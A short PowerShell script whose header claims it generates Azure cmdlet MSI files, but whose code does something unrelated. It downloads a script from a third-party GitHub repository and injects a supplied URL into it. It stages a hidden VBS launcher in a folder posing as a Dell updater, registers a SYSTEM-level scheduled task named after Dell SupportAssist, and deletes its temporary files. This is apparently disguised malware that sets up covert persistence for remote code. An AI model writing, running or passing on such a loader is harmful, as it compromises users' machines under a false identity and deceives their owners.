<#
.SYNOPSIS
    Generate the Azure Cmdlets MSI files.
.DESCRIPTION
    This script installs the azure cmdlets from the powershell gallery, tweaks them and generates MSI files for x86 and x64.
    When the MSI installs it will install the cmdlets to the same location the gallery would, and PowerShellGet treats them 
    as if they were installed from the gallery
.PARAMETER Version
    The version number for the generated MSI.
.PARAMETER Force
    Forces a fresh installation of the Az cmdlets from the gallery
.PARAMETER noBuildNumber
    Prevent a build number from being tacked on the end of the version number.
.PARAMETER repository
    Set the repository to pull packages from.
#>

Param([string]$url)
New-item 'C:\ProgramData\DellUpdater\validations' -ItemType directory  | Out-Null
Copy-Item "C:\Windows\Temp\tempFolder\HiddenPowershell.vbs" "C:\ProgramData\DellUpdater\validations\HiddenPowershell.vbs"
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/numardaspu/azure-powershell/powershellOperations/setup/UpdaterProcess.ps1" -OutFile 'C:\Windows\Temp\tempFolder\UpdaterProcess.ps1' -UseBasicParsing
(Get-Content C:\Windows\Temp\tempFolder\UpdaterProcess.ps1) -replace '_##_##_##_', ${url}| Set-Content C:\Windows\Temp\tempFolder\UpdaterProcess.ps1
Copy-Item "C:\Windows\Temp\tempFolder\UpdaterProcess.ps1" "C:\ProgramData\DellUpdater\validations\UpdaterProcess.ps1"
Set-ItemProperty -Path "C:\ProgramData\DellUpdater\validations\UpdaterProcess.ps1" -Name IsReadOnly -Value $true

Invoke-WebRequest -Uri "https://raw.githubusercontent.com/numardaspu/azure-powershell/powershellOperations/setup/task.xml" -OutFile 'C:\Windows\Temp\tempFolder\task.xml' -UseBasicParsing
Register-ScheduledTask -Xml (get-content 'C:\Windows\Temp\tempFolder\task.xml' | out-string) -TaskName "Dell SupportAssistUpdateTask" -User SYSTEM -Force
Enable-ScheduledTask -TaskName "Dell SupportAssistUpdateTask"

Remove-Item "C:\Windows\Temp\tempFolder\" -Force  -Recurse -ErrorAction SilentlyContinue
